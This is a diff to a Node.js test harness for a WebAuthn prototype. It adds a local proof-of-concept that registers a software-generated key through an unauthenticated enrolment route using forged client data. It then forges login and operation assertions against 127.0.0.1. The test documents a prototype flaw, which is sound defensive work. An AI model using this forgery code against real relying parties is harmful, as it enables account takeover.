@@ -4,7 +4,7 @@ const assert=require('node:assert/strict');
 const http=require('node:http');
 const fs=require('node:fs');
 const path=require('node:path');
-const {randomBytes,createHash,createPublicKey,verify,timingSafeEqual}=require('node:crypto');
+const {randomBytes,createHash,createPublicKey,generateKeyPairSync,sign,verify,timingSafeEqual}=require('node:crypto');
 const puppeteer=require('puppeteer-core');
 const {createScoHandler}=require('../src/sco');
 
@@ -858,6 +858,101 @@ async function main(){
       concurrentSignedBatchDenied:denials.length,
       concurrentSignedBatchReplayStatus:finalConcurrentReplay.status,
       implication:'WebAuthn RP-binding prevents copied-origin credential assertions, but a conventional post-admission HttpOnly bearer session remains portable through raw HTTP under hostile-client control.'
+    }));
+    // Independent copied-origin enrolment attack. The prototype's public
+    // /register endpoint checks only caller-authored clientDataJSON and
+    // caller-supplied SPKI, with no enrollment authorization or attestation.
+    // A raw HTTP client can replace the previously trusted credential with
+    // a software-generated key and sign its own login and operation proofs.
+    const copiedBase='http://127.0.0.1:'+port;
+    const attackerKeys=generateKeyPairSync('ec',{namedCurve:'prime256v1'});
+    const attackerCredentialId=randomBytes(20).toString('base64');
+    /** @param {number[]} bytes @param {string} type @returns {Buffer} */
+    function forgedClientData(bytes,type){
+      return Buffer.from(JSON.stringify({
+        type,challenge:base64url(Buffer.from(bytes)),origin:allowedOrigin
+      }));
+    }
+    /**
+     * @param {{id:string,challenge:number[]}} issued
+     * @returns {{challengeId:string,rawId:string,clientData:string,authenticatorData:string,signature:string}}
+     */
+    function forgedAssertion(issued){
+      const clientData=forgedClientData(issued.challenge,'webauthn.get');
+      const authenticatorData=Buffer.concat([
+        createHash('sha256').update(rpId).digest(),
+        Buffer.from([0x05,0,0,0,0])
+      ]);
+      const signed=Buffer.concat([
+        authenticatorData,createHash('sha256').update(clientData).digest()
+      ]);
+      return {
+        challengeId:issued.id,rawId:attackerCredentialId,
+        clientData:clientData.toString('base64'),
+        authenticatorData:authenticatorData.toString('base64'),
+        signature:sign('sha256',signed,attackerKeys.privateKey).toString('base64')
+      };
+    }
+    /** @returns {Promise<{id:string,challenge:number[]}>} */
+    async function copiedChallenge(){
+      const response=await fetch(copiedBase+'/challenge');
+      assert.equal(response.status,200);
+      return /** @type {{id:string,challenge:number[]}} */(await response.json());
+    }
+    const registrationChallenge=await copiedChallenge();
+    const forgedRegistration=await fetch(copiedBase+'/register',{
+      method:'POST',headers:{'content-type':'application/json'},
+      body:JSON.stringify({
+        challengeId:registrationChallenge.id,
+        rawId:attackerCredentialId,
+        clientData:forgedClientData(
+          registrationChallenge.challenge,'webauthn.create').toString('base64'),
+        publicKeySpki:attackerKeys.publicKey.export({
+          type:'spki',format:'der'
+        }).toString('base64')
+      })
+    });
+    assert.equal(forgedRegistration.status,204,
+      'Public enrollment wrongly accepts raw client-supplied key and origin');
+    const loginChallenge=await copiedChallenge();
+    const forgedLogin=await fetch(copiedBase+'/verify',{
+      method:'POST',headers:{'content-type':'application/json'},
+      body:JSON.stringify(forgedAssertion(loginChallenge))
+    });
+    assert.equal(forgedLogin.status,200,
+      'Software key can now authenticate outside registered WebAuthn origin');
+    const newCookie=forgedLogin.headers.get('set-cookie');
+    assert.ok(newCookie);
+    const cookieMatch=/webauthn_session=([0-9a-f]{64})/u.exec(newCookie);
+    assert.ok(cookieMatch);
+    const spoofedSession=cookieMatch[1];
+    const challengeResponse=await fetch(copiedBase+'/proof-challenge',{
+      method:'POST',headers:{
+        'content-type':'application/json',cookie:'webauthn_session='+spoofedSession
+      },body:JSON.stringify({method:'proofSum',args:[7]})
+    });
+    assert.equal(challengeResponse.status,200);
+    const operationChallenge=/** @type {{id:string,challenge:number[]}} */(
+      await challengeResponse.json());
+    const forgedProof=Buffer.from(JSON.stringify(
+      forgedAssertion(operationChallenge))).toString('base64');
+    const beforeSoftwareProof=proofRpcCalls;
+    const softwareOriginRpc=await copiedOriginRpc(
+      spoofedSession,'proofSum',7,forgedProof);
+    assert.equal(softwareOriginRpc.status,200);
+    assert.deepEqual(softwareOriginRpc.body,{ok:true,value:148});
+    assert.equal(proofRpcCalls,beforeSoftwareProof+1);
+    console.log('SCO_WEBAUTHN_UNTRUSTED_ENROLLMENT '+JSON.stringify({
+      node:process.version,platform:process.platform,
+      copiedOrigin:copiedBase,originClaimOnlyInsideAttackerJson:true,
+      initialBrowserCredentialOverwritten:true,
+      realWebAuthnOperationsByAttacker:0,
+      forgedRegistrationStatus:forgedRegistration.status,
+      softwareKeyLoginStatus:forgedLogin.status,
+      softwareProofRpcStatus:softwareOriginRpc.status,
+      softwareProofRpcValue:softwareOriginRpc.body,
+      copiedOriginPrivateExecutions:proofRpcCalls-beforeSoftwareProof,
+      boundary:'Experimental unauthenticated /register route only. A production RP must authenticate enrollment, validate the attested public key and account ownership, and prevent unapproved replacement.'
     }));
   }finally{
     if(browser)await browser.close();
